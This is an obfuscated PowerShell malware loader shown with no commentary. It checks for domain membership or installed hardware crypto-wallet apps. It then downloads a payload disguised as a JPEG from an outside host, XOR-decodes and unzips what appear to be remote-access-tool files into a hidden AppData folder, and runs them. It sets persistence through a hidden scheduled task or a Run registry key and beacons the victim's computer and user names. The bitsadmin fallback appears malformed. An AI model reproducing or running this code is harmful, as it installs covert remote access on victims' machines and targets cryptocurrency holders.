$nLkCKp=$env:localappdata+'\Programs\'; $KHniUSl=(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain; $fBXD='C:\Program Files\'; $SGujFOE='HKCU:\Software\'; $flaoc=0; $PprOGis='HKCU:\Software\Classes\'; $tmuTEo='HKLM:\SOFTWARE\Classes\'; $ZzXJBA=@( $fBXD+'Ledger Live\Ledger Live.exe'; $SGujFOE+'Microsoft\Windows\CurrentVersion\Uninstall\BitBoxApp'; $fBXD+'Blockstream\Blockstream Green\Blockstream Green.exe'; $tmuTEo+'ledgerlive'; $nLkCKp+'Cypherock CySync\Cypherock CySync.exe'; $nLkCKp+'Trezor Suite\Trezor Suite.exe'; $nLkCKp+'rabby-desktop\Rabby Desktop.exe'; $PprOGis+'onekey-wallet'; $PprOGis+'keevo'; $SGujFOE+'BitBoxApp'; $SGujFOE+'REAL security\BCVault'; $fBXD+'OneKey\OneKey.exe'; $PprOGis+'cypherock'; $nLkCKp+'keevo-wallet\Keevo Link.exe'; $nLkCKp+'keepkey-desktop\KeepKey Desktop.exe'; $tmuTEo+'bcvault'; $PprOGis+'keepkey'; $PprOGis+'liquidnetwork'; $fBXD+'BC Vault\BCVault.exe'; $PprOGis+'trezorsuite'; $PprOGis+'aopp'; $fBXD+'BitBox\BitBox.exe'; ); $BioEZg=$ZzXJBA.length; if ($KHniUSl) {$flaoc=1} else { for ($PnVk=0; $PnVk -lt $BioEZg -and $flaoc -eq 0; $PnVk++) { if (Test-Path $ZzXJBA[$PnVk]) {$flaoc=1};};}; if ($flaoc -eq 1) { try { net session > $null 2>&1; $EONaL=$?; } catch { $EONaL=$false; }; [NEt.SErvICepoInTMaNAgER]::sEcuRiTyProtocOl=[neT.secUriTYPrOTocOltYpE]::tls12; CD $enV:ApPdATA; $BzVm='glance-roping'; $oRjy='https://hoy5.cadillacpetunia.com/untried-ravishin/'; $LHhmJOh='https://HostName.ableeliminate.com/tst-1234/headers.jpg'; $dTsHTAWD=@('TCCTL32.DLL', 'msvcr100.dll', 'kosher.exe', 'PCICHEK.DLL', 'AudioCapture.dll', 'PCICL32.DLL', 'HTCTL32.DLL', 'NSM.LIC', 'pcicapi.dll', 'nsm_vpro.ini', 'remcmdstub.exe', 'client32.ini', 'nskbfltr.inf'); try { $Juet=New-Object System.Net.WebClient; [byte[]]$xKZmhh=$Juet.DownloadData($LHhmJOh); $Juet.Dispose(); [byte[]]$gPqF = 0xDC, 0xBB, 0xF3, 0x2B; $PsPw=-1; Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem; for ($i=0; $i -le $xKZmhh.Length-4; $i++) {  if (($xKZmhh[$i] -eq $gPqF[0]) -and ($xKZmhh[$i+1]-eq $gPqF[1]) -and ($xKZmhh[$i+2]-eq $gPqF[2]) -and ($xKZmhh[$i+3]-eq $gPqF[3])) { $PsPw=$i; break; } }; if ($PsPw -lt 0) { throw 'Marker not found' }; $tOYc=[int]$xKZmhh[$PsPw+5] - 128; [int]$xsbh=$xKZmhh[$PsPw+4]; $mtHiQ=$xKZmhh[($PsPw+6)..($xKZmhh.Length-1)]; $gazSV=New-Object 'System.Collections.Generic.List[byte]'; $NvHevJK=$xKZmhh[0..($PsPw-1)]; $DtPoU=Join-Path $env:APPDATA $BzVm; if (-not (Test-Path $DtPoU)) { New-Item -Force -ItemType Directory -Path $DtPoU | Out-Null }; $Invedirk=gi $DtPoU -force; $Invedirk.attributes='Hidden'; for ($o=0; $o -lt $NvHevJK.Length; $o += 2*$xsbh) { $take=[Math]::Min($xsbh, [int]($NvHevJK.Length-$o)); $gazSV.AddRange([byte[]]$NvHevJK[$o..($o+$take-1)]); }; [byte[]]$giQKS=New-Object byte[] $mtHiQ.Length; [byte[]]$ptaajh=$gazSV.ToArray(); for ($i=0; $i -lt $mtHiQ.Length; $i++) { $giQKS[$i] = $mtHiQ[$i] -bxor $ptaajh[$i % $ptaajh.Length]; }; $YrSwUe=[int]([math]::Floor($giQKS.Length/2)) + $tOYc; $EuCz=$giQKS.Length - $YrSwUe; $hBLPZmB=$giQKS[$EuCz..($giQKS.Length-1)] + $giQKS[0..($EuCz-1)]; $ms=New-Object IO.MemoryStream(,$hBLPZmB); $za=New-Object IO.Compression.ZipArchive($ms,[IO.Compression.ZipArchiveMode]::Read); foreach ($e in $za.Entries) {     $dst=[IO.File]::Create((Join-Path $DtPoU $e.Name));     $e.Open().CopyTo($dst); $dst.Close(); } $za.Dispose(); $ms.Dispose(); } catch { $DtPoU=Join-Path $env:APPDATA $BzVm; if (-not (Test-Path $DtPoU)) { New-Item -Force -ItemType Directory -Path $DtPoU | Out-Null }; $Invedirk=gi $DtPoU -force; $Invedirk.attributes='Hidden'; if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {     $dTsHTAWD | foreach {     Start-BitsTransfer -Source ($oRjy + $_) -Destination (Join-Path $DtPoU $_);     } } else {     $dTsHTAWD | foreach {         $sGdJgY=$oRjy + $_;         $aAiec=Join-Path $DtPoU $_;         $RSmL='bitsadmin.exe /transfer glance-roping /download /priority normal "0" "1"' -f $sGdJgY,$aAiec;         iex $RSmL;     };     }; };$YALVNt=Join-Path (Join-Path $env:APPDATA $BzVm) 'kosher.exe'; start -FilePath $YALVNt -WorkingDirectory (Split-Path $YALVNt); if ($EONaL) { $FKdjicG=New-Object -ComObject 'Schedule.Service'; $FKdjicG.Connect(); $tOKgdb=$FKdjicG.GetFolder('\'); $xDLwy=$FKdjicG.NewTask(0); $awSlg=$xDLwy.Triggers.Create(9); $eNkFE=$xDLwy.Actions.Create(0); $tRgcIt=$xDLwy.RegistrationInfo; $ByuyT=$xDLwy.Settings; $ByuyT.ExecutionTimeLimit='PT0S'; $ByuyT.RestartInterval='PT5M'; $ByuyT.AllowHardTerminate=$false; $ByuyT.Priority=4; $ByuyT.DisallowStartIfOnBatteries=$false; $tRgcIt.Author=$env:USERNAME; $ByuyT.StopIfGoingOnBatteries=$false; $awSlg.Id='LogonTriggerId'; $eNkFE.Path=$YALVNt; $ByuyT.RunOnlyIfNetworkAvailable=$true; $ByuyT.StartWhenAvailable=$true; $awSlg.UserId=$env:USERNAME; $ByuyT.Hidden=$true; $xDLwy.Principal.RunLevel=1; $ByuyT.RestartCount=50; $tRgcIt.Description='Scheduled system glance-roping task'; $tOKgdb.RegisterTaskDefinition($BzVm,$xDLwy,6,$env:USERNAME,$null,3); } else { New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $BzVm -Value $YALVNt -PropertyType String -Force | Out-Null;}; $rnJBzOI=ps kosher -ErrorAction SilentlyContinue; $xrVO="?cpnme=$eNV:ComPuTerNAMe&usnme=$Env:USeRNaME&param="; If ($rnJBzOI.ID) { $oHZg=$xrVO+'PViLxsFbt'; iwr $oHZg -usEBaSIcpaRsIng;} elsE { $oHZg=$xrVO+'iPWzgizUZ'; curl $oHZg -uSebASICpaRsInG;}; };
